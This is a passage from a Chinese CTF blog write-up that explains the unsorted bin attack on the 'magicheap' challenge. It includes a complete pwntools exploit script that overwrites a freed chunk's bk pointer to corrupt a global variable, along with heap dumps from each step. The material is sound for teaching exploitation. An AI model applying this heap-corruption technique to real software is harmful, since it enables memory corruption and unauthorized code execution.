buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(heaparray[v1]);<br>    heaparray[v1] = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>正常free操作，指针清0，不存在uaf</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./magicheap'</span>)<br>p = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">29691</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>heap_ptr = <span class="hljs-number">0x6020E0</span><br>magic = <span class="hljs-number">0x6020C0</span><br>goal = magic - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># 申请一个small chunk</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)   <span class="hljs-comment">#chunk0</span><br><span class="hljs-comment"># 申请一个chunk1防 chunk0 合并</span><br>create(<span class="hljs-number">500</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>) + p64(<span class="hljs-number">0</span>) + p64(goal)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">"666"</span>)<br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">"4869"</span>)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="创建两个chunk"><a href="#创建两个chunk" class="headerlink" title="创建两个chunk"></a>创建两个chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span>	<span class="hljs-comment">//chunk0</span><br><span class="hljs-number">0x1a65010</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x000000000000000a</span> <br><span class="hljs-number">0x1a65020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span>	<span class="hljs-comment">//chunk1</span><br><span class="hljs-number">0x1a65030</span>:	<span class="hljs-number">0x6262626262626262</span>	<span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure>

<p>申请的 chunk(500) 以防止合并</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65440</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000201</span>	<span class="hljs-comment">//chunk3</span><br><span class="hljs-number">0x1a65450</span>:	<span class="hljs-number">0x6363636363636363</span>	<span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="free掉small-chunk，被放入到-unsorted-bin-中"><a href="#free掉small-chunk，被放入到-unsorted-bin-中" class="headerlink" title="free掉small chunk，被放入到 unsorted bin 中"></a>free掉small chunk，被放入到 unsorted bin 中</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:	<span class="hljs-number">0x6161616161616161</span>	<span class="hljs-number">0x000000000000000a</span><br><span class="hljs-number">0x1a65020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:	<span class="hljs-number">0x00007f9bd595bb78</span>	<span class="hljs-number">0x00007f9bd595bb78</span><br></code></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all: <span class="hljs-number">0x1a65020</span> —▸ <span class="hljs-number">0x7f9bd595bb78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x1a65020</span><br></code></pre></td></tr></tbody></table></figure>

<p>被放入unsorted bin 中</p>
<p>观察全局变量</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020d0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020e0</span> &lt;heaparray&gt;:	<span class="hljs-number">0x0000000001a65010</span>	<span class="hljs-number">0x0000000000000000</span><br>    										#chunk1已经被<span class="hljs-built_in">free</span>掉<br><span class="hljs-number">0x6020f0</span> &lt;heaparray+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000001a65450</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="溢出到目的位置"><a href="#溢出到目的位置" class="headerlink" title="溢出到目的位置"></a>溢出到目的位置</h3><p>通过对chunk 0 进行溢出 修改 chunk1 的 bk 指针，到magic-0x10的位置</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x1a65000</span><br><span class="hljs-number">0x1a65000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x1a65020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span>	<br><span class="hljs-number">0x1a65030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00000000006020b0</span> <span class="hljs-comment">// bk -&gt; magic - 0x10</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk"><a href="#再申请一个-大小大于-small-chunk-且-小与刚刚-释放的chunk-的大小的-chunk" class="headerlink" title="再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk"></a>再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020b0</span> &lt;<span class="hljs-built_in">stdin</span>@@GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span>&gt;:	<span class="hljs-number">0x00007f9bd595b8e0</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:	<span class="hljs-number">0x00007f9bd595bb78</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure>

<p>可以看到magic 已经被改成了0x00007f9bd595bb78，这个值是main_arena+88</p>
<p>最后我们输入 4869 就可以打印flag 了</p>
<p>flag{unsorted_bin_attack}</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/14/unsorted%20bin%20attack/">unsorted bin Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unsortedbin-attack%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">unsortedbin_attack（例题）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">程序源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">main 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#l33t-%E5%AD%98%E5%9C%A8%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">l33t 存在后门函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meau%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.4.</span> <span class="toc-text">meau函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.5.</span> <span class="toc-text">create函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.6.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.7.</span> <span class="toc-text">delete函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AAchunk"><span class="toc-number">1.4.1.</span> <span class="toc-text">创建两个chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free%E6%8E%89small-chunk%EF%BC%8C%E8%A2%AB%E6%94%BE%E5%85%A5%E5%88%B0-unsorted-bin-%E4%B8%AD"><span class="toc-number">1.4.2.</span> <span class="toc-text">free掉small chunk，被放入到 unsorted bin 中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E5%88%B0%E7%9B%AE%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.3.</span> <span class="toc-text">溢出到目的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E7%94%B3%E8%AF%B7%E4%B8%80%E4%B8%AA-%E5%A4%A7%E5%B0%8F%E5%A4%A7%E4%BA%8E-small-chunk-%E4%B8%94-%E5%B0%8F%E4%B8%8E%E5%88%9A%E5%88%9A-%E9%87%8A%E6%94%BE%E7%9A%84chunk-%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%9A%84-chunk"><span class="toc-number">1.4.4.</span> <span class="toc-text">再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>